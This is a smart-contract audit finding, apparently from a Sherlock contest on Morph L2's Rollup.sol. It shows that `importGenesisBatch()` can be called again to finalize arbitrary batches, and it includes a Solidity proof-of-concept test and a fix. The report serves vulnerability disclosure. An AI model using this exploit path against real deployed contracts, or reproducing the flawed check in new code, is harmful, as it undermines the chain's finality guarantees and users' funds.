# Owner can arbitrarily finalize batches by manipulating `importGenesisBatch()`

### Summary

An incorrect check in `importGenesisBatch()` allows an owner to maintain the ability to finalize any batch at any time with no challenge process, breaking the security guarantees of the chain.

### Root Cause

In `Rollup.sol`, the `importGenesisBatch()` function is used to allow the owner to import the first batch without a ZK proof. This gives a starting point for future ZK proofs to be performed against.

The [following check](https://github.com/sherlock-audit/2024-08-morphl2/blob/main/morph/contracts/contracts/l1/rollup/Rollup.sol#L178) is intended to ensure that the owner can only import the first batch, and not skip the proving process for future batches:
```solidity
require(finalizedStateRoots[0] == bytes32(0), "genesis batch imported");
```
However, there is no guarantee that the genesis batch imported is batch `0`. As we can see, the `batchIndex` is determined by reading the batch header argument, and we simply finalize whatever batch is passed.

This allows an owner to pass a valid, non-zero index batch to start the chain, arousing no suspicion. However, this leaves the door open that `importGenesisBatch()` can be called at any time in the future to immediately finalize any batch, breaking the security promises of the chain.

### Internal Preconditions

1. Owner needs to call `importGenesisBatch()` with a non-zero batch index.

### External Preconditions

None

### Attack Path

1. Owner calls `importGenesisBatch()` with a non-zero batch index.
2. Later, at any point, they can call `importGenesisBatch()` again with a different value, immediately finalizing any batch they want with no challenge process.

### Impact

The owner can arbitrarily finalize any batch, breaking the security guarantees of the chain.

### PoC

The following test can be added to `Rollup.t.sol` to demonstrate the attack:
```solidity
function testPapa_doubleImportGenesis() external {
    bytes memory batchHeader = new bytes(249);

    // import genesis batch first
    assembly {
        mstore8(add(batchHeader, add(0x20, 8)), 1)
        mstore(add(batchHeader, add(0x20, 25)), 1)
        mstore(add(batchHeader, add(0x20, 57)), 0x010657f37554c781402a22917dee2f75def7ab966d7b770905398eba3c444014)
        mstore(add(batchHeader, add(0x20, 121)), 1) // postStateRoot
        mstore(add(batchHeader, add(0x20, 217)), 0) // parentBatchHash
    }
    hevm.startPrank(multisig);
    rollup.importGenesisBatch(batchHeader);
    assertEq(rollup.finalizedStateRoots(1), bytes32(uint256(1)));

    assembly {
        mstore(add(batchHeader, add(0x20, 121)), 420) // postStateRoot
    }
    rollup.importGenesisBatch(batchHeader);
    assertEq(rollup.finalizedStateRoots(1), bytes32(uint256(420)));
}
```

### Mitigation

Enforce a check that `batchIndex == 0` in `importGenesisBatch()`, which will ensure it can only be called once.
